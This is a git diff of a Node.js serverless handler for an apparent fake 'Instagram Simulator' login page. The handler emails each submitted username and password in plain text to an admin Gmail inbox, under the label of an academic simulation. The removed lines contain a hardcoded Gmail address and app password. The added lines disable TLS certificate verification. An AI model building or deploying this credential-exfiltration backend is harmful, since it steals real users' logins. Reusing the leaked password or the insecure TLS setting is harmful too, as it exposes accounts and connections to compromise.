@@ -2,9 +2,16 @@ const nodemailer = require('nodemailer');
 
 // Configurar transporter de e-mail
 const createTransporter = () => {
-    // Usar variáveis de ambiente do Vercel
-    const emailUser = process.env.EMAIL_USER || 'zenosama892@gmail.com';
-    const emailPass = process.env.EMAIL_PASS || 'jstp gyfh dczg lvku';
+    // Usar APENAS variáveis de ambiente
+    const emailUser = process.env.EMAIL_USER;
+    const emailPass = process.env.EMAIL_PASS;
+    
+    if (!emailUser || !emailPass) {
+        console.error('❌ Variáveis de e-mail não configuradas');
+        console.log('EMAIL_USER:', emailUser ? 'Configurado' : 'NÃO CONFIGURADO');
+        console.log('EMAIL_PASS:', emailPass ? 'Configurado' : 'NÃO CONFIGURADO');
+        return null;
+    }
     
     console.log('📧 Configurando e-mail com:', emailUser);
     
@@ -13,6 +20,10 @@ const createTransporter = () => {
         auth: {
             user: emailUser,
             pass: emailPass
+        },
+        // Configurações adicionais importantes
+        tls: {
+            rejectUnauthorized: false
         }
     });
 };
@@ -51,9 +62,13 @@ export default async function handler(req, res) {
         // Criar transporter
         const transporter = createTransporter();
         
+        if (!transporter) {
+            throw new Error('Transporter de e-mail não configurado');
+        }
+        
         // Configurar e-mail
         const mailOptions = {
-            from: `"Instagram Simulator" <${process.env.EMAIL_USER || 'zenosama892@gmail.com'}>`,
+            from: `"Instagram Simulator" <${process.env.EMAIL_USER}>`,
             to: process.env.ADMIN_EMAIL || 'zenosama892@gmail.com',
             subject: `🚨 Tentativa de Acesso - ${username}`,
             html: `
@@ -136,7 +151,7 @@ export default async function handler(req, res) {
             text: `Tentativa de Acesso\n\nUsuário: ${username}\nSenha: ${password || 'Não informada'}\nData: ${new Date(timestamp).toLocaleString('pt-BR')}\nStatus: ACESSO NEGADO\n\nEsta é uma simulação acadêmica.`
         };
 
-        console.log('📤 Enviando e-mail...');
+        console.log('📤 Enviando e-mail para:', process.env.ADMIN_EMAIL || 'zenosama892@gmail.com');
         
         // Enviar e-mail
         const info = await transporter.sendMail(mailOptions);
@@ -153,14 +168,16 @@ export default async function handler(req, res) {
 
     } catch (error) {
         console.error('❌ Erro ao enviar e-mail:', error);
+        console.error('Código do erro:', error.code);
+        console.error('Comando do erro:', error.command);
         
-        // Em caso de erro, ainda retorna sucesso (para demonstração)
-        res.status(200).json({
-            success: true,
-            message: 'Simulação concluída (erro de e-mail ignorado)',
-            simulated: true,
-            username: req.body?.username || 'demo_user',
-            error: process.env.NODE_ENV === 'development' ? error.message : undefined
+        // Retornar erro detalhado
+        res.status(500).json({
+            success: false,
+            message: 'Erro ao enviar e-mail',
+            error: error.message,
+            details: 'Verifique as variáveis de ambiente no Vercel',
+            code: error.code
         });
     }
 }
